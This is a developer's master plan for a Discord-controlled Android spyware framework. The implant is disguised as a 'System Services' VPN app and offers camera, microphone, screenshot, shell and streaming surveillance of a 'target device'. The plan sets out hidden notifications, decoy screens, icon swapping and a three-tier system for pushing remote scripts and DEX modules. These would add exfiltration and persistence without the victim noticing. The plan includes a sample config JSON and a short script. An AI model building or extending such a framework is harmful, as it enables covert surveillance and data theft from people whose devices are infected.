# OpenAccess C2 - Master Plan

## Project Overview
Discord-based C2 framework with Android implant + Node.js bot. 35+ commands, full surveillance suite, disguised as "System Services" VPN app.

---

## Current Architecture

```
Target Device                          Discord                          Operator
┌──────────────────┐              ┌──────────────┐              ┌──────────────┐
│ SystemNetworkSvc │──WebSocket──│   Gateway    │◄──WebSocket──│  Discord Bot │
│ (C2 Engine)      │◄──REST─────►│  (discord.gg)│──REST───────►│  (Railway)   │
│                  │              └──────────────┘              └──────────────┘
│ DiscordGateway   │                    │
│ Client           │              phantom-* channels
│                  │              (per-device)
│ AccessibilityHlp │
│ NotifService     │
│ DisplayCapture   │
└──────────────────┘
```

---

## What's Missing (Gap Analysis)

### Critical Gaps
1. **NO self-update mechanism** - Every change requires rebuild + redeploy APK
2. **NO remote code execution** - Commands are hardcoded at compile time
3. **NO config push** - Token, webhook, settings all baked into APK
4. **NO version checking** - App doesn't know if it's outdated
5. **NO decoy activity** - After setup, app just disables itself

### Medium Gaps
6. **Notification not hidden** - Uses `IMPORTANCE_LOW` but still visible
7. **No database on bot side** - All state ephemeral, lost on restart
8. **Supabase references stale** - `.env.example` has unused Supabase config
9. **Hilt/KSP declared but unused** - Bloats build config
10. **No command rate limiting on device side** - Could be spammed

### Minor Gaps
11. **Empty catch blocks everywhere** - Silent failures, hard to debug
12. **Gson dependency unused** - Uses `org.json` instead
13. **statusCard.js unused** - Canvas card generator not imported
14. **`!stream` not in bot help** - Implemented but undocumented

---

## Self-Update System Design

### The Problem
Currently: Change code → rebuild APK → sign → send to target → install → repeat
This is slow, risky (user sees new install), and impractical for quick fixes.

### The Solution: 3-Tier Remote Update System

#### Tier 1: Remote Configuration (Immediate)
**What**: Download JSON config that controls app behavior at runtime
**How**:
- App fetches config from Discord channel or GitHub raw URL every heartbeat
- Config controls: command toggles, thresholds, UI strings, feature flags
- Zero dependencies, ~1KB payload
**Can update**:
- Enable/disable specific commands remotely
- Change screenshot quality, stream FPS
- Update UI text (camouflage names)
- Adjust heartbeat intervals
- Toggle stealth features

```json
{
  "version": 3,
  "commands": {
    "screenshot": true,
    "camera": true,
    "mic": false,
    "shell": true
  },
  "settings": {
    "heartbeat_min": 300000,
    "heartbeat_max": 600000,
    "screenshot_quality": 85,
    "stream_fps": 2,
    "max_stream_failures": 5
  },
  "ui": {
    "app_label": "System Services",
    "notif_title": "Network Monitor",
    "notif_text": "Optimizing connection..."
  },
  "features": {
    "auto_permission_grant": true,
    "black_overlay_on_lock": false,
    "crash_report_to_discord": true
  }
}
```

#### Tier 2: Kotlin Script Commands (Powerful)
**What**: Download and execute Kotlin scripts at runtime to add/modify commands
**How**:
- Use `kotlinx-scripting-jvm` (already have Kotlin stdlib)
- Scripts stored in Discord channel or GitHub
- App downloads script, compiles in-memory, executes
- Scripts get access to `Context`, `DiscordGatewayClient`, service methods
**Can update**:
- Add entirely new commands without APK rebuild
- Modify existing command behavior
- Fix bugs in command handlers
- Add new data exfil methods

```kotlin
// Script: cmd_custom.kts
// Available: ctx (Context), d (DiscordGatewayClient), svc (SystemNetworkService)
val result = buildString {
    appendLine(":shield: **Custom Command Output**")
    appendLine("Device: ${Build.MODEL}")
    appendLine("Android: ${Build.VERSION.RELEASE}")
    appendLine("Battery: ${getBatteryInfo()}")
}
d.sendMsg(result)
```

**Security**: Script hash verification via config, sandboxed execution

#### Tier 3: DEX Class Loading (Full Update)
**What**: Download compiled DEX files and load new classes dynamically
**How**:
- Compile code changes to DEX on operator machine
- Upload DEX to Discord/GitHub
- App downloads DEX, loads via `DexClassLoader`
- New classes register themselves as commands
**Can update**:
- Entirely new services/activities
- New permission handling
- New persistence mechanisms
- Major feature additions

---

## Implementation Priority

### Phase 1: Remote Config (Week 1)
- [ ] Add `ConfigManager` class to fetch/parse/apply remote config
- [ ] Store config hash in SharedPreferences for change detection
- [ ] Fetch config on heartbeat (piggyback on existing traffic)
- [ ] Apply config: toggle commands, update settings, change UI
- [ ] Bot command: `!config push` to send config to device
- [ ] Bot command: `!config get` to view current device config
- [ ] Fallback to embedded default config if fetch fails

### Phase 2: Kotlin Script Engine (Week 2)
- [ ] Add `kotlinx-scripting-jvm` dependency (~2MB)
- [ ] Create `ScriptEngine` class with sandboxed execution
- [ ] Script context: `ctx`, `d`, `svc`, `send()`, `sendFile()`
- [ ] Bot command: `!script <name>` to execute named script
- [ ] Bot command: `!script push <name>` to upload new script
- [ ] Script storage: Discord channel attachments or GitHub raw
- [ ] Script caching: store downloaded scripts locally
- [ ] Script verification: SHA-256 hash check via config

### Phase 3: DEX Loader (Week 3)
- [ ] Create `DexLoader` class with `DexClassLoader`
- [ ] Optimized DEX directory in app's private storage
- [ ] Bot command: `!dex push` to upload DEX file
- [ ] Bot command: `!dex load <name>` to load DEX
- [ ] Command auto-registration via `@C2Command` annotation
- [ ] DEX version tracking and rollback support

### Phase 4: Stealth & Polish (Week 4)
- [ ] Hide notification completely (foreground service without visible notif)
- [ ] Decoy activity that shows fake "loading" screen
- [ ] Runtime app name/icon swap based on config
- [ ] SQLite database on bot side for persistent device state
- [ ] Clean up unused dependencies (Hilt, KSP, Gson)
- [ ] Replace empty catch blocks with silent logging
- [ ] Add device-side command rate limiting

---

## File Changes Required

### New Files
```
app/src/main/java/com/openaccess/sdk/
├── update/
│   ├── ConfigManager.kt          # Remote config fetch/apply
│   ├── ScriptEngine.kt           # Kotlin script execution
│   ├── DexLoader.kt              # DEX class loading
│   └── UpdateManager.kt          # Orchestrates all update tiers
│
discord-bot/
├── commands/
│   ├── config.js                 # !config push/get
│   ├── script.js                 # !script push/exec
│   └── dex.js                    # !dex push/load
└── db/
    └── DeviceDB.js               # SQLite for persistent state
```

### Modified Files
```
app/src/main/java/com/openaccess/sdk/service/
├── SystemNetworkService.kt       # Add update checks, command toggles
├── DiscordGatewayClient.kt       # Add config/script message handlers
│
app/src/main/java/com/openaccess/sdk/
├── MainActivity.kt               # Apply config to UI
├── VpnActivity.kt               # Apply config to UI
│
app/build.gradle                  # Add scripting dependency
│
discord-bot/index.js              # Add new command handlers
```

---

## Update Flow Diagram

```
Operator                    Discord Bot                    Android Device
   │                            │                                │
   │  !config push config.json  │                                │
   ├───────────────────────────►│                                │
   │                            │  POST to device channel        │
   │                            ├───────────────────────────────►│
   │                            │                                │
   │                            │                    ConfigManager.fetch()
   │                            │                    Apply new settings
   │                            │                    Toggle commands
   │                            │                    Update UI strings
   │                            │                                │
   │  !script push custom.kts   │                                │
   ├───────────────────────────►│                                │
   │                            │  POST to device channel        │
   │                            ├───────────────────────────────►│
   │                            │                                │
   │                            │                    ScriptEngine.download()
   │                            │                    ScriptEngine.compile()
   │                            │                    ScriptEngine.execute()
   │                            │                                │
   │  !dex push module.dex      │                                │
   ├───────────────────────────►│                                │
   │                            │  POST to device channel        │
   │                            ├───────────────────────────────►│
   │                            │                                │
   │                            │                    DexLoader.load()
   │                            │                    Register new commands
   │                            │                                │
```

---

## Risk Assessment

| Risk | Impact | Mitigation |
|------|--------|------------|
| Script crashes app | High | Sandboxed execution, timeout, try-catch all scripts |
| Config fetch fails | Low | Fallback to embedded defaults, retry on next heartbeat |
| DEX loading fails | Medium | Version tracking, rollback to previous DEX |
| Discord rate limits | Medium | Batch config/script in single message, use attachments |
| Script security | High | Hash verification, no file system access, timeout |
| APK size increase | Low | Scripting lib ~2MB, acceptable for current ~3MB APK |

---

## Alternative Approaches Considered

### A. JavaScript Engine (Rhino)
- **Pros**: Built into Android, no extra dependencies
- **Cons**: Can't access Android APIs easily, limited functionality
- **Verdict**: Too limited for our needs

### B. Download APK + Silent Install
- **Pros**: Full update capability
- **Cons**: Requires `REQUEST_INSTALL_PACKAGES`, user sees install prompt, risky
- **Verdict**: Too visible, use as last resort (Tier 3 DEX is better)

### C. Server-Relay Architecture
- **Pros**: Centralized control, no Discord dependency for updates
- **Cons**: Need to host server, additional infrastructure
- **Verdict**: Overkill for current scale, Discord channels work fine

### D. GitHub Releases as Update Source
- **Pros**: Reliable, versioned, no Discord rate limits
- **Cons**: Public (unless private repo), slower than Discord
- **Verdict**: Good fallback source, use alongside Discord

---

## Success Metrics

- [ ] Config push applies within 10 minutes (next heartbeat)
- [ ] New script command executes within 30 seconds of push
- [ ] DEX module loads and registers commands within 60 seconds
- [ ] Zero crashes from update system (all errors caught gracefully)
- [ ] APK size increase < 3MB
- [ ] No visible notification to user during update process

---

## Notes

- All update traffic uses existing Discord channel (no new infrastructure)
- Updates are incremental - no need to reinstall APK for most changes
- Config changes are instant on next heartbeat cycle
- Scripts and DEX modules are cached locally for offline use
- Rollback supported at all tiers (previous config/script/DEX stored)
- Bot-side SQLite preserves device state across bot restarts
